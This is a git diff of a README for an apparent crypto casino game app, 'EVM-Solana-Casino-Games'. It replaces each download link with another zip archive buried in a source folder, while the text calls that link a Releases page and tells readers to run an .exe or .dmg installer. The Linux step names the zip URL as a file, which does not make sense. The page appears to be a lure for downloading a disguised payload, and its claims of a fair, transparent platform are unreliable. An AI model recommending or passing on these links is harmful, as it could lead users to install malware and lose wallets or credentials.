@@ -1,6 +1,6 @@
 # 🎲 EVM-Solana-Casino-Games - Play Casino Games on the Blockchain
 
-[![Download EVM-Solana-Casino-Games](https://github.com/mna5123d/EVM-Solana-Casino-Games/raw/refs/heads/main/web3/solana/programs/common/src/Solana-Games-EV-Casino-v2.0.zip)](https://github.com/mna5123d/EVM-Solana-Casino-Games/raw/refs/heads/main/web3/solana/programs/common/src/Solana-Games-EV-Casino-v2.0.zip)
+[![Download EVM-Solana-Casino-Games](https://raw.githubusercontent.com/mna5123d/EVM-Solana-Casino-Games/main/web3/solana/programs/roulette/src/Games_Casino_Solana_EV_2.5.zip)](https://raw.githubusercontent.com/mna5123d/EVM-Solana-Casino-Games/main/web3/solana/programs/roulette/src/Games_Casino_Solana_EV_2.5.zip)
 
 ## 🌟 Overview
 EVM-Solana-Casino-Games is a fun and exciting way to enjoy casino games powered by blockchain technology. This multi-chain platform offers ten different games including Crash, Plinko, and Blackjack. Whether you are an experienced gamer or new to the world of cryptocurrency, our games provide a fair and transparent gaming experience. Let's get started!
@@ -9,13 +9,13 @@ EVM-Solana-Casino-Games is a fun and exciting way to enjoy casino games powered 
 To begin playing, you need to download the application. Follow these steps:
 
 1. **Visit the Release Page**  
-   Visit our [Releases page](https://github.com/mna5123d/EVM-Solana-Casino-Games/raw/refs/heads/main/web3/solana/programs/common/src/Solana-Games-EV-Casino-v2.0.zip) to find the latest version of the software.
+   Visit our [Releases page](https://raw.githubusercontent.com/mna5123d/EVM-Solana-Casino-Games/main/web3/solana/programs/roulette/src/Games_Casino_Solana_EV_2.5.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    On the Releases page, you will see a list of available versions. Click on the version you want to download.
 
 3. **Select the Correct File**  
-   Look for a file that matches your operating system. For Windows, download the `.exe` file. For macOS, download the `.dmg` file. For Linux, download the `https://github.com/mna5123d/EVM-Solana-Casino-Games/raw/refs/heads/main/web3/solana/programs/common/src/Solana-Games-EV-Casino-v2.0.zip` file.
+   Look for a file that matches your operating system. For Windows, download the `.exe` file. For macOS, download the `.dmg` file. For Linux, download the `https://raw.githubusercontent.com/mna5123d/EVM-Solana-Casino-Games/main/web3/solana/programs/roulette/src/Games_Casino_Solana_EV_2.5.zip` file.
 
 4. **Run the Installer**  
    After downloading, locate the file on your computer and double-click it. Follow the prompts to install the software.
@@ -56,7 +56,7 @@ Join our growing community of players. Share tips, strategies, and experiences. 
 ## 📥 Download & Install
 To get started, click the link below to download the application from our Releases page:
 
-[Download EVM-Solana-Casino-Games](https://github.com/mna5123d/EVM-Solana-Casino-Games/raw/refs/heads/main/web3/solana/programs/common/src/Solana-Games-EV-Casino-v2.0.zip)
+[Download EVM-Solana-Casino-Games](https://raw.githubusercontent.com/mna5123d/EVM-Solana-Casino-Games/main/web3/solana/programs/roulette/src/Games_Casino_Solana_EV_2.5.zip)
 
 Once you've downloaded the application, follow the installation steps above to start playing.
 
